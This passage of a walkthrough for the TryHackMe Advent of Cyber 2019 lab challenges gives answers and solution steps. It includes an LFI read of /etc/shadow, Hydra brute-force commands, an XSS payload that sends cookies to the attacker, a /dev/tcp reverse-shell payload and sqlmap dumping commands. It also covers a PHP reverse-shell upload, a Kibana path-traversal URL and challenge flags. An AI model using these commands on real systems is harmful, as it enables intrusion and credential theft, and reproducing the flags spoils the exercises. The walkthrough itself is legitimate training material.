Q2: What is in the file?
A: mcchef
**Solution**
So now we see the key `employee_names.txt` from previous question so now we can see its content using the following URL `https://advent-bucket-one.s3.amazonaws.com/employee_names.txt`

## Task 20  [Day 15] LFI

![](https://i.imgur.com/hsmLEZr.png)

Elf Charlie likes to make notes and store them on his server. Are you able to take advantage of this functionality and crack his password? 

Read the supporting materials [here](https://blog.tryhackme.com/lfi/).

**Answer the questions below**

Q1:What is Charlie going to book a holiday to?
A: Hawaii
**Solution**
Visit the website and its first page have the answer

![Task20Hawaeii](https://user-images.githubusercontent.com/85181215/134503300-2230eb3c-c18d-47d1-b268-eb64f921cfcd.png)

Q2: Read /etc/shadow and crack Charlies password.
A: password1
**Solution**
Go to the following link to get the shadow file 
http://IP-Here/get-file/%2fetc%2fshadow
When you got the shadow file so you can copy the password hash for `charlie` user and save it in a file and then use the following command to get the password
```shell
$ john hash.txt --wordlist=/usr/share/rockyou.txt
```

Q3: What is flag1.txt?
A: THM{4ea2adf842713ad3ce0c1f05ef12256d}
**Solution**
So from above we have the charlie password so we can ssh to the system because from nmap scan report we see port 22 is open for ssh so we can use it like the following command
```shell
$ ssh charlie@$IP_HERE
```

## Task 21  [Day 16] File Confusion

The Christmas monster got access to some files and made a lot of weird changes_. Can you help fix these changes?

Use a (python) script to do the following:

-   extract all the files in the archives 
-   extract metadata from the files 
-   extract text from the files

Use the questions to guide you on how to write the script. Check out the supporting material [here](https://docs.google.com/document/d/13eYEcqpyp3fIAnaDR8PHz6qibBJJwf2Vp5M77KkEKtw/edit#).

**Answer the questions below**

Q1: How many files did you extract(excluding all the .zip files)
A: 50

Q2: How many files contain Version: 1.1 in their metadata?
A: 3 

Q3: Which file contains the password?
A: dL6w.txt

**Solution/Script**

I don't know python so i use bash scripting to solve that problem but i also don't know bash scripting that much but they are a little easy because they use Linux command and that we use daily so this will solve our problem but i google to know about `while-read` loop with the help of that i made the following script

```bash
#!/bin/bash


mkdir -p zip/extract

cd zip

unzip ../final-final-compressed.zip

cd extract

zip_files= ls /home/waheed/THM/'Advent of Cyber 1 2019'/task21/zip > temp.txt


#filename= temp.txt
while read line;
do
	
	echo '[+] ----------------------------------------------------';

	unzip /home/waheed/THM/'Advent of Cyber 1 2019'/task21/zip/$line 

done < temp.txt
 
 rm temp.txt 


echo '[+] ----------------------------------------------------';

text_files= ls > textFiles 

while read files;
do
	exiftool $files | egrep -i '1.1' 
done < textFiles

echo ''

while read files;
do
	
	cat $files | egrep -i 'password' && echo 'File Contains the Password is [ '$files ']'

done < textFiles

echo -e '\n[+] Extracted Files\n'
echo -e '====='

ls  /home/waheed/THM/'Advent of Cyber 1 2019'/task21/zip/extract | wc -l
echo -e '====='


rm -r /home/waheed/THM/'Advent of Cyber 1 2019'/task21/zip



echo ''
echo '================================================================'
echo 'Finished'
echo '================================================================'
```

Its Output is like this

![image](https://user-images.githubusercontent.com/85181215/134694684-f36dd7eb-0c8f-4325-908c-7ac576eade5b.png)


My fellow [A3r1t](https://tryhackme.com/p/Amrit456852) made a code that is written in python that solve our problem the code like this 

```Python
import os
import zipfile
import exiftool

# Extracting Main Zip file
with zipfile.ZipFile('C:\\Users\\Name\\Downloads\\final-final-compressed.zip','r') as zip_ref:
        zip_ref.extractall('C:\\Users\\Name\\Downloads\\THM')



# Listing and Extracting Files
listoffiles = os.listdir('C:\\Users\\Name\\Downloads\\THM')

for f in listoffiles:
    with zipfile.ZipFile('C:\\Users\\Name\\Downloads\\THM\\{}'.format(f),'r') as zip_ref:
        zip_ref.extractall('C:\\Users\\Name\\Downloads\\THM')


# Listing Extracted FIles
files= []
nooffiles = 0
listoffiles = os.listdir('C:\\Users\\Name\\Downloads\\THM')
for f in listoffiles:
    if ".zip" not in f:
        nooffiles=nooffiles+1
        files.append("C:\\Users\\Name\\Downloads\\THM\\{}".format(f))

print("No of Files Extracted : ",nooffiles)


# Getting and Displaying Version from MetaData
with exiftool.ExifTool (r'C:\Users\Name\Documents\ex\exiftool.exe') as et:
    metadata=et.get_tag_batch("Version",files)

count =0
for d in metadata:
    if str(d) == "1.1":
       count=count+1;

print("files contain Version: 1.1 in their metadata : {}".format(count))


# Reading Files
for f in files:
    filetoread = open(f,'r')
    for lines in filetoread:
        if "password" in lines:
            print(lines)
            break
```

And its output is like this 


![image](https://user-images.githubusercontent.com/85181215/134768400-165f86ed-0cc8-45a0-bdcc-174283dfbac1.png)

This code is written on windows so the path are in windows format and exiftool give you some problem also so if your linux machine have exiftool
install so use `os` function to call that and modify the code accordingly

## Task 22 [Day 17] Hydra-ha-ha-haa 

![image](https://user-images.githubusercontent.com/85181215/134759373-cbfa0d2e-7087-4313-96b9-a0abd8a45dda.png)


You suspect Elf Molly is communicating with the Christmas Monster. Compromise her accounts by brute forcing them!

Use Hydra to brute force Elf Molly's password. Use the rockyou.txt password list, which can be found here.

Supporting materials can be found here.

This machine will take between 3-4 minutes to boot.

**Answer the questions below**

Q1: Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH).
**Hint: If you've tried more than 30 passwords from RockYou.txt, you are doing something wrong!**

A:  THM{2673a7dd116de68e85c48ec0b1f2612e}
**Solution**
Use the following hydra command to get the login password for `molly` user 
```hydra 
$ hydra -l "molly" -P /usr/share/wordlists/rockyou.txt 10.10.210.167 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V -I
```
When you got the credential login to web and got the flag there

Q2: Use Hydra to bruteforce molly's SSH password. What is flag 2?

A:THM{c8eeb0468febbadea859baeb33b2541b}

**Solution**
Use the following hydra command to bruteforce `molly` user ssh password
```
$ hydra -l "molly" -P /usr/share/wordlists/rockyou.txt 10.10.210.167 -t 4 ssh
```
When you got the credentials login to ssh using the following command 
```ssh
$ ssh molly@10.10.210.167
```
When successfully login to ssh see the flag in molly home directory using the command `cat flag2.txt`

## Task 23  [Day 18] ELF JS

McSkidy knows the crisis isn't over. The best thing to do at this point is OSINT

_we need to learn more about the christmas monster_

During their OSINT, they came across a Hacker Forum. Their research has shown them that this forum belongs to the Christmas Monster. Can they gain access to the admin section of the forum? They haven't made an account yet so make sure to register.

Access the machine at http://[your-ip-address]:3000[](http://[your-ip-address]:3000) - **it may take a few minutes to deploy.**

Check out the supporting material [here](https://docs.google.com/document/d/19TJ6ANmM-neOln0cDh7TPMbV9rsLkSDKS3nj0eJaxeg/edit#).

_P.S. If you want to learn more about XSS, we have a [room](https://tryhackme.com/room/xss) where you can learn about it in depth._

**Answer the questions below**

Q1: What is the admin's authid cookie value?
A: 2564799a4e6689972f6d9e1c7b406f87065cbf65
**Solution**
First register a account and then login with that account there you have to paste the following payload

```
payload: <script>window.location = ‘http://Local_Ip_Here:Port/page?param=’ + document.cookie </script>
```

After that you have to start a listener `netcat` is also use for this but in my case they don't work fine so i use the following command to start a listener  

```
$ ruby -run -ehttpd . -p4444
```

So now every thing is ready now you just have to wait in 2-3 min admin cookie is fetch by your listener.

## Task 24  [Day 19] Commands

Another day, another hack from the Christmas Monster. Can you get back control of the system?

Access the web server on [http://[your-ip]:3000/]

McSkidy actually found something interesting on the /api/cmd endpoint.

Check out the supporting material [here](https://docs.google.com/document/d/1W65iKmUMtz-srteErhrGFJkWBXJ4Xk5PYlCZVMIZgs8/edit?usp=sharing).

**Answer the questions below**

Q1: What are the contents of the user.txt file?
A: 5W7WkjxBWwhe3RNsWJ3Q
**Solution**
Go to the following URL 
```URL
http://10.10.10.10:3000/api/cmd/ls
```
When we go there we see they run system command and give us the output of `ls` command so we have command execution to the target system so we can use it to get reverse shell or we can just get the flag also but for me i get reverse shell first with the following URL encoded payload: 
```ReverseShell
sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.10.33%2F4444%200%3E%261
```
This payload give me a reverse shell with root privileges after that i go to `/home/bestadmin` directory and there i got the user flag 

## Task 25  [Day 20] Cronjob Privilege Escalation

You think the evil Christmas monster is acting on Elf Sam's account!

Hack into her account and escalate your privileges on this Linux machine.

There is no supporting material - the only new concept in this challenge is Linux cronjobs. Join our [Discord](https://discord.gg/wvfe3XJ) if you're really struggling.

**Answer the questions below**

Q1: What port is SSH running on?

**Hint: Use nmap to enumerate services on ports 4000 and 5000.**

A: 4567

Q2: Crack sam's password and read flag1.txt

**Hint: Complete the challenge on day 17, to understand how to use Hydra.**

A: THM{dec4389bc09669650f3479334532aeab}

**Solution**

So Here we know the username `sam` but we don't know the password for that user so we use hydra to brute force that user password if the password is weak we can easily crack that password. But we have to note `ssh` service is not running on default port so we have to specify port number with `-s` flag. And the final command are following:-

```hydra
$ hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.230.252 -t 4 ss  
h -s 4567
```

Its output is like this 

```hydra Output
└──╼ $hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.230.252 -t 4 ss  
h -s 4567  
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use i  
n military or secret service organizations, or for illegal purposes (this is  
non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-30 22  
:09:08  
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/  
p:14344399), ~3586100 tries per task  
[DATA] attacking ssh://10.10.230.252:4567/  
[4567][ssh] host: 10.10.230.252 login: sam password: chocolate  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-30 22  
:10:01
```

Here we got `sam` user password `chocolate`.

Now connect to ssh using the following command

```ssh
$ ssh sam@10.10.230.252 -p 4567
```

Now you connect to the ssh and read the flag using command `cat flag1.txt`.

Q3: Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?

A: THM{b27d33705f97ba2e1f444ec2da5f5f61}

**Solution**

So Now we got flag 1 but for getting flag 2 we have to do some privilege escalation stuff and from question we see we have to do this using cronjobs so to do that first i use the following command to see cronjobs for the system `cat /etc/crontabs` but there i did not get anything use full so i run `linpeas` for getting some privilege escalation vectors and i see there is also an other user on the system name `ubuntu` so i go there and see `flag2.txt` in there home directory but they are only read able by that user. But in home directory i see a directory name `scripts` and when i go there i see a bash script owned by `ubuntu` user and they are read and writeable to every one so i think that user set cronjob that script and when i see its content they are removing every thing from `/tmp` directory so i edit that script and add the following command

```shell
chmod 777 /home/ubuntu/flag2.txt
```

After that we can see the flag2.txt

## Task 26  [Day 21] Reverse Elf-ineering

![](https://i.imgur.com/kd2ZbQT.png)  

McSkidy has never really touched low level languages - this is something they must learn in their quest to defeat the Christmas monster.

Download the archive and apply the command to the following binary files: `chmod +x file-name`

Please note that these files are compiled to be executed on Linux x86-64 systems.

The questions below are regarding the challenge1 binary file.

Read the supporting materials [here](https://drive.google.com/file/d/1maTcdquyqnZCIcJO7jLtt4cNHuRQuK4x/view?usp=sharing).

**Answer the questions below**

Q1: What is the value of local_ch when its corresponding movl instruction is called(first if multiple)?

A: 1

**Solution**

Download the task file and there we got two files `file1` and `challenge1` here `file1` is the file you can use to follow the supporting material to understands how to do task in radar2 aka r2. when you familiar with r2 then you use your knowledge in `challenge1` file to solve the answer.
So now do the task by first open the `chanllenge1` file in `r2` with the following command
```shell
$ r2 -d challenge1
```
This will open it in debugged mode and after that the next command we use is `aa` That will analyze the binary.

When they will complete use the command `afl` this will analyze the function and list it.They show us many function so we can grep specific function like `main` using the following command
```r2
afl | grep main
```
![image](https://user-images.githubusercontent.com/85181215/135634079-b7fb1abf-f141-4d2a-92a7-bc6089b30f2b.png)

Here's we see the `main` function in the output so now we can use the following command to view its summary
```r2
pdf@main
```
and output is like this 

![Task26Pdfmain](https://user-images.githubusercontent.com/85181215/135634968-c7669658-6fa7-4afc-ac11-38af673bfa04.png)

There we see three variables  `var_ch` `var_8h` and `var_4h` so our question is to find the value of `local_ch` that represent `var_ch` here so do the following steps to find its value first we have to set breakpoints using the following command syntax
```r2
db <memory location>
```
So according to question we have to set three breakpoints first on the following line 

![Task26Db1](https://user-images.githubusercontent.com/85181215/135635051-39a0942b-956c-4f2a-9ad8-b1151cbb27fc.png)

Second one is here 

![Task26Db2](https://user-images.githubusercontent.com/85181215/135635144-db4467f7-8036-409b-9760-6143e7dcced0.png)

And third one is here

![Task26Db3](https://user-images.githubusercontent.com/85181215/135635196-82e9997c-2f1a-4152-8c8f-a0b90beca7c5.png)

So we can use its memory address in `db` command syntax and after setting all the breakpoints we get the following output

![Task26Breakpoints](https://user-images.githubusercontent.com/85181215/135635269-c5e5c7f2-bc0f-4e13-a4c9-1984cfbd747b.png)


We see all the breakpoints address have small `b` after it so that means our breakpoints is set now we can run the binary with the command `dc` they will run the binary and stop on our first break point so now we use the following command  syntax
```r2
px @<variable address here>
```
This show us variable value in hex so the above command is like this 
```r2
px @rbp-0xc
```
![Task26Var_ch](https://user-images.githubusercontent.com/85181215/135635392-f4b43955-9fe6-4f30-9afc-4faa38cfcd9d.png)


Here we see hex value is only `0000` so use `ds` command now to compile one step after break point and again use `px @rbp-0xc` command and we see the following output now 

![Task26Var_ch1](https://user-images.githubusercontent.com/85181215/135635487-13f69231-5f60-4d27-b028-92c023fbf3d0.png)


And we got the first variable value and it is `1`

Q2: What is the value of eax when the imull instruction is called?

A: 6
**Solution**

So Now we use the same procedure again for second break point use `dc` command to compile second break point we set and again use `pdf@main` and we see we are now at second break point and now we `ds` command to compile one step after and now we use `dr` command because we are now interested to see register value not a variable so we use `dr` command and we see our register value is like this

![Task26Eax](https://user-images.githubusercontent.com/85181215/135635568-b169f9e4-884a-4b6e-80d6-2b680e743d00.png)


And there we see register value is `6` in last that's its value

Q3: What is the value of local_4h before eax is set to 0?

A: 6
**Solution**
Now again use `dc` to compile the third break point and use `pdf@main` to see break point and now use `px` command with forth variable address like we do in first step to see its value like this 
```r2
px @rbp-0x4
```
and our output is like this 

![Task26Var_ch4](https://user-images.githubusercontent.com/85181215/135635681-1c2e04ec-5a53-4b35-9a94-b4d7cbec9391.png)


and we see the variable hex value have `6` and that our answer

## Task 27  [Day 22] If Santa, Then Christmas

McSkidy has been faring on well so far with assembly - they got some inside knowledge that the christmas monster is weaponizing if statements. Can they get ahead of the curve?

These programs have been compiled to be executed on Linux x86-64 systems.

Check out the supporting material [here](https://docs.google.com/document/d/1cIHd_YQ_PHhkUPMrEDWAIfQFb9M9ge3OFr22HHaHQOU/edit?usp=sharing). 

The questions below relate to the _if2_ binary.

**Answer the questions below**

Q1: what is the value of local_8h before the end of the main function?

A: 9

**Solution**

To find the answer for this task we have to know about if statements syntax and also understand how they work on assembly language also in assembly language they use jumps to control the structure we know about it on supporting materials TryHackMe made for us above. Download the task file and open supporting material and use `if1` binary to follow along with supporting material. When you are good in that then use your knowledge to solve this task as follows

first open the binary in radara2 binary with the following command
```bash
$ r2 -d if2
```
after that use the following command in `r2`
```r2
e asm.syntax=att
```
After that use `aaa` command to analyze the program when this is done use `afl` command to analyze the functions they show you so many functions so you can use `afl | grep main` instead.
Now you see `main` function there so use `pdf@main` command to see the main function and try to understand the program.

![task27_if2main](https://user-images.githubusercontent.com/85181215/136015754-c5a07d29-44dd-4527-a88a-eefc94ad6d36.png)


The image above shows that there are two variables `var_8h` and `var_4h` the first `var_8h` stores value `8` in it and `var_4h` stores value `2` in it. After that `var_8h` value is transferred to `eax` register so `eax` register now have value `8` in it.
After that we see two jumps in the program also `jle` and `jmp` we can know about that jumps in supporting materials

![task27_jumps](https://user-images.githubusercontent.com/85181215/136015792-a9bf361a-ff4c-40d3-bd02-566a0dc1b730.png)

So `jle` is the jump that check if the condition is `less or equal` and `jmp` is the `unconditional` jump.We can see one statement above `jle` jump there is a statement like following
```
0x00400b62 3b45fc cmpl var_4h, %eax
```
`cmpl` is checking/comparing the `var_4h` with `eax` register.**Note `var_4h`
have value `2` and `eax` have value `8`.**
So they compare is 2 is less or equal to 8 and we know they are not less or equal to 8 so this jump will not execute and execution is move forward one step ahead and we see they statement like following
```
0x00400b67 8345f801 addl $1, var_8h
```
they add `1` in `var_8h` that have value 8 in it so after that there value is 9 and that our answer for this question.

Q2: what is the value of local_4h before the end of the main function?

A: 2

**Solution**

After adding the value 1 in var_8h there is a jump statement and that are unconditional jump in the program so program control now move to the following statement
```
0x00400b71 b800000000 movl $0, %eax
```
And that clear the value of `eax` with 0 and after that there is just the ending instruction for the program so var_4h value does not change in the ending of program so var_4h have value 2 in it.

But this is just a theory we do to check if this is correct we have to set up break points in the program with the `db` command with memory location where we want to add break points.We add break points in the program both jumps.

![task27_if2Break](https://user-images.githubusercontent.com/85181215/136015850-3d15d50a-2e44-4877-b7ae-d73c48286535.png)


From the above image we see how its looks like when we setup a break point in the program so when program execute there execution is now break in the first line where we setup the break point.We can see it when we execute the program with `dc` command in r2 they compile the program. 
Now program is compiled and there execution is stop in the `jle` jump so we can see the values of `var_8h`,`var_4h` and `eax` register like this

![task27_Values](https://user-images.githubusercontent.com/85181215/136015896-af3d4f48-1143-4c93-b124-c5d24fc398c3.png)

there we use `px @<var_8h r2 memory location>` and `px @<var_4h r2 memory loacation>` command to see the value of the variables in memory and that is in the form of hex.And we use `dr` command to see registers values and there we see `rax` register value that is `eax` register and its register value is in the form of register values but they are 8 we see in the end.
That's all the values of the variable that are in memory before the first break point we set on first jump in program.Now we use `ds` command to execute one statement after the break and now if we use again `px @<var_8h r2 memory location>` command we see the `var_8h` have now a value 9 instead of 8 because their value is now incremented because of the following statement
```
0x00400b67 8345f801 add dword [var_8h], 1
```
Now we use `dc` command to execute the program again but now our execution break is set on second jump and then we use `ds` command to execute one statement ahead of break and check all the variables values again using the above method we use and we see `eax` register now have value `0`, `var_8h` have value `9` and `var_4h` have value `2` and after that program is end so now we practically see the variables values also.

## Task 28  [Day 23] LapLANd (SQL Injection)

Santa’s been inundated with Facebook messages containing Christmas wishlists, so Elf Jr. has taken an online course in developing a North Pole-exclusive social network, LapLANd! Unfortunately, he had to cut a few corners on security to complete the site in time for Christmas and now there are rumours spreading through the workshop about Santa! Can you gain access to LapLANd and find out the truth once and for all?

**This machine may take up to 5 minutes to boot and configure.**

Supporting material available [here](https://docs.google.com/document/d/15XH_T1o6FLvnV19_JnXdlG2A8lj2QtepXMtVQ32QXk0/edit?usp=sharing).  

**Answer the questions below**

Q1: Which field is SQL injectable? Use the input name used in the HTML code.
**Hint: SQLMap will highlight which field is vulnerable, if you decide to use it.**

A: log_email

**Solution**

```shell
$ sqlmap -u 'http://10.10.139.141/register.php' --dbms="MySQL" --forms --dbs --batch
```

Use the Above `sqlmap` command to enumerate target databases there 
- `-u` is use to specify Target URL
- `--dbs` is use for enumerate databases in DBMS
- `--dbms="MySQL"` is use to specify the target system is using MySQL database
- `--forms` is use to specify we are targeting the form in the target URL
-   `--batch` is use to specify Never ask for user input, use the default behavior

When this command run they search every method to do `SQLi` and they take a while and when they found the `SQLi` vulnerability they search all available Databases in DBMS and after that show you all the databases like the following

![Task28_SQLi_Databases](https://user-images.githubusercontent.com/85181215/136405222-b7b0b2df-b057-4ea1-b1c9-a0d4e09e9a09.png)


There we see the payload `sqlmap` use to check is it vulnerable or not and when they found out that then they search all the databases in DBMS and then show us all the result 

Q2: What is Santa Claus' email address? 
**Hint: If your injection is going very slowly, consider enumerating only the information you need instead of trying to dump the whole database.**

A: `bigman@shefesh.com`

**Solution**

Now we got the Databases in DBMS so we have to see which database is use in `LapLand` and we see there is a `social` database so we target that to database.
so now we have to know how many tables in that database so we use the following command to get total number of tables in social database

```shell
$ sqlmap -u 'http://10.10.139.141/register.php' --dbms="MySQL" --forms -D "social" --tables --batch
```

There 

- `-u` is use to specify Target URL
- `--dbms="MySQL"` is use to specify the target system is using MySQL database
- `--forms` is use to specify we are targeting the form in the target URL
- `-D` is use to specify Database name we want to target here it is `social`
- `--tables` is use to specify enumerate all the tables in mentioned database
-   `--batch` is use to specify Never ask for user input, use the default behavior

So when this command run they do `SQLi` again by finding injection vector first and then enumerate mentioned database tables and show us all the result like following

![Task28_SQLi_Tables](https://user-images.githubusercontent.com/85181215/136405299-de5072cc-2311-4e7c-93d8-03eec60e39b2.png)


There we see all the tables in social database and we see there is a `users` table so now we target that table and enumerate total number of columns in that tables with the following command
```
$ sqlmap -u 'http://10.10.139.141/register.php' --dbms="MySQL" -D "social" -T "users" --columns  --batch --forms
```
There
- `-u` is use to specify Target URL
- `--dbms="MySQL"` is use to specify the target system is using MySQL database
- `--forms` is use to specify we are targeting the form in the target URL
- `-D` is use to specify Database name we want to target here it is `social`
- `-T` is use to specify Table name in mentioned database
-  `--columns` is use to specify enumerate total columns in mentioned table
-   `--batch` is use to specify Never ask for user input, use the default behavior

When this command run they show us all the columns in mentioned tables and database like following

![Task28_SQLi_Columns](https://user-images.githubusercontent.com/85181215/136405361-cbd4dc26-0458-4d13-b95c-51b9fab3c455.png)


There we see all the columns in the table so now we can dump all the data in that columns using the following command 

```
$ sqlmap -u 'http://10.10.139.141/register.php' --dbms="MySQL" -D "social" -T "users" --dump --batch --forms
```
There 
- `--dump` is use to specify dump all the data in the mentioned table
When this command run they show us every data in the table like the following

![Task28_SQLi_Columns_Data](https://user-images.githubusercontent.com/85181215/136405411-70dc9ed9-2abe-40ce-8ec6-7f363d2035fd.png)


There we all the columns that we enumerate previously but now we also got its content and there we see all users email,Name,usernames and password hash etc   

Q3: What is Santa Claus' plaintext password?
**Hint: It's in rockyou.txt - also try online sites such as HashKiller or Crackstation**

A: saltnpepper

**Solution**

Copy Santa Claus password hash and use any password cracking tool like `hashcat` or `john` etc to crack it or you can also use online site `crackstation`
to crack that hash 

Q4: Santa has a secret! Which station is he meeting Mrs Mistletoe in?
**Hint: Look at the private messages between users, either through the database or logging in as Santa!**

A: Waterloo

**Solution**

Now you got Santa Claus email and password from previous task so now you can use that to login to Santa account in `Lapland`.After login go to message section to see Santa private messages to get the answer

Q5: Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/
**Hint: If you're getting an error about a file format being blacklisted, try looking up alternative file extensions that will still execute.**

A: THM{SHELLS_IN_MY_EGGNOG}

**Solution**

Now you have Santa account so you can upload a PHP reverse shell in Post section first download the PHP reverse shell from the  [  pentestmonkey/php-reverse-shell - GitHub](https://github.com/pentestmonkey/php-reverse-shell) and edit your system IP Address and Port number you want to get reverse shell back and save it and try to upload that as a Santa Post.They are not uploaded because they use some blacklist to block `php` extension so you can rename that `php` reverse shell and change its extension with `phtml` and try to upload it and they work so now start a listener on your system with the port you set in reverse shell with the following command
```sh
$ nc -lvnp 4444
```
After that reload that the page or right click to your `php reverse shell` post and click on reload image and  after you will get the reverse shell back to your listener if not use different extension like `phps,php7` etc

Now you got the reverse shell so now use the following command to see the flag
```shell
$ cat /home/user/flag.txt
```
## Task 29  [Day 24] Elf Stalk

McDatabaseAdmin has been trying out some new storage technology and came across the ELK stack(consisting of Elastic Search, Kibana and Log Stash). 

The Christmas Monster found this insecurely configured instance and locked McDatabaseAdmin out of it. Can McSkidy help to retrieve the lost data?

While this task does not have supporting material, here is a general approach on how to go about this challenge:

-   scan the machine to look for open ports(specific to services running as well)
-   as with any database enumeration, check if the database requires authentication. If not, enumerate the database to check the tables and records
-   for other open ports, identify misconfigurations or public exploits based on version numbers

**The machine may take up to 5 minutes to boot.**

**Answer the questions below**

Q1: Find the password in the database
**Hint: how do you search for strings in an elasticsearch database**

A: 9Qs58Ol3AXkMWLxiEyUyyf

**Solution**

First of all use Nmap to scan all open port 

![Task29AllPorts](https://user-images.githubusercontent.com/85181215/136557995-9f6e02ce-afb8-4f52-8dce-7be358bb9454.png)


There we see 6 open port and two ports have http service running on it but when i go there i don't understand what is use for so i use port 5601 there they host `kibana` web service i do a google search to learn about it but i did'nt understand anything there but in management section we see a console so there we can search some query with a little researching on google found how to do that and use the following query and run it to find the password

![Task29password](https://user-images.githubusercontent.com/85181215/136558044-472a5e3f-d48a-4ab4-95b5-45ae5c0cc003.png)


Q2: Read the contents of the /root.txt file
**Hint: use the 3rd open port and a Kibana public vulnerability**

A someELKfun

**Solution**

To find the root flag we have to find public vulnerability and to do that we have to find which version `kibana` they host again google it and found that there is a `status` directory there we see the plugin version to find the version number after found out that search a public vulnerability and found LFI vulnerability there take some time to understand what they doing and after that i use the following URL to get the flag that present in `/root.txt` path 

```
10.10.5.205:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../root.txt
```

When to go to that location web site will hang and did not load something and keep searching but when you go the port 8000 log files they are host there you can find root flag but you have to use you eagle eye there because there are so many things 

![Task29_flag](https://user-images.githubusercontent.com/85181215/136558094-fedf6d41-8d0a-455c-b92e-0d69424017b4.png)

There is a RCE flaw also and got the following URL there they show some prof of concept also but could not able to execute that because there we don't have `convas` menu i think this is for different version

```
https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
```

## Task 30  [Day 25] Challenge-less

To everyone who participated in our Advent of Cyber event, we hope you learnt something new! There is no challenge on the last day, instead we ask you complete a room on TryHackMe and enjoy some time off on Christmas day!

  

We will pick the daily prize winners and the main winners on Sunday, so there is still time to complete challenges and enter yourself!





